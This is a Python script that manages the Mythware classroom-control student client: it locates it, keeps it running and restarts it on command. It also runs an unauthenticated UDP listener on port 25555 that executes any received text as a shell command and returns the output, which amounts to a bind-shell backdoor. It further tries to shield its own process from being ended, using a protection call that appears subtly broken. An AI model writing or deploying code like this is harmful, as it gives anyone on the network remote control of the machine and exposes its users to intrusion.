import os
import re
import sys
import time
import glob
import ctypes
import socket
import threading
import subprocess

def find_studentmain_path():
    """寻找极域学生端路径"""
    base_dir = r"C:\Program Files*\Mythware\极域课堂管理系统软件v*.* *"
    exe_files = glob.glob(os.path.join(base_dir, "**", "studentmain.exe"), recursive=True, include_hidden=True)
    if exe_files:
        return exe_files[0]  # 返回第一个找到的路径
    return None

def is_studentmain_running():
    # 检查studentmain.exe进程是否存在
    result = subprocess.run('tasklist', shell=True, capture_output=True, text=True)
    return 'studentmain.exe' in result.stdout.lower()

def monitor_studentmain(studentmain_path):
    # 监控studentmain.exe进程
    while True:
        if studentmain_path and not is_studentmain_running():
            print("检测到studentmain未运行，正在自动启动...")
            try:
                subprocess.Popen(f'"{studentmain_path}"', shell=True)
                print("studentmain已启动。")
            except Exception as e:
                print(f"启动studentmain失败: {e}")
        time.sleep(10)  # 检测间隔延长，降低占用

def udp_server():
    host = '0.0.0.0'
    port = 25555
    studentmain_path = find_studentmain_path()
    if studentmain_path:
        print(f"已自动检测到极域路径: {studentmain_path}")
        # 只启动一次监控线程
        threading.Thread(target=monitor_studentmain, args=(studentmain_path,), daemon=True).start()
    else:
        print("未检测到极域路径，重启极域功能将不可用。")

    kernel32 = ctypes.windll.kernel32
    kernel32.SetProcessShutdownParameters(0x100, 0)  # 最高保护级别
    kernel32.SetProcessInformation(
        kernel32.GetCurrentProcess(),
        0x2000,  # ProcessProtectionLevel
        b"\x01\x00\x00\x00",  # PROTECTED_PROCESS
        4
    )

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        server_socket.bind((host, port))
        print(f"UDP server listening on port {port}...")

        while True:
            try:
                data, addr = server_socket.recvfrom(1024)
                message = data.decode('utf-8')
            except Exception as e:
                print(f"接收数据时发生错误: {e}")
                continue

            try:
                if message == "HANDSHAKE":
                    print(f"收到握手包来自 {addr}")
                    server_socket.sendto("HANDSHAKE_ACK".encode('utf-8'), addr)

                elif message == "SPECIAL_SCAN":
                    print(f"收到特殊扫描包来自 {addr}")
                    server_socket.sendto("SPECIAL_RESPONSE".encode('utf-8'), addr)

                elif message == "RESTART_STUDENTMAIN":
                    if studentmain_path:
                        try:
                            subprocess.run("taskkill /f /im studentmain.exe /t", shell=True)
                            subprocess.Popen(f'"{studentmain_path}"', shell=True)
                            server_socket.sendto("极域已重启".encode('utf-8'), addr)
                            print("已执行极域重启命令。")
                        except Exception as e:
                            msg = f"重启极域失败: {e}"
                            server_socket.sendto(msg.encode('utf-8'), addr)
                            print(msg)
                    else:
                        server_socket.sendto("未找到极域路径".encode('utf-8'), addr)
                        print("未找到极域路径，无法重启。")
                
                    
                else:
                    try:
                        result = subprocess.run(message, shell=True, text=True, capture_output=True)
                        output = result.stdout if result.stdout else result.stderr
                        server_socket.sendto(output.encode('utf-8'), addr)
                    except Exception as e:
                        error_msg = f"命令执行出错: {e}"
                        server_socket.sendto(error_msg.encode('utf-8'), addr)
                        print(error_msg)
            except Exception as e:
                print(f"处理消息时发生错误: {e}")

if __name__ == "__main__":
    udp_server()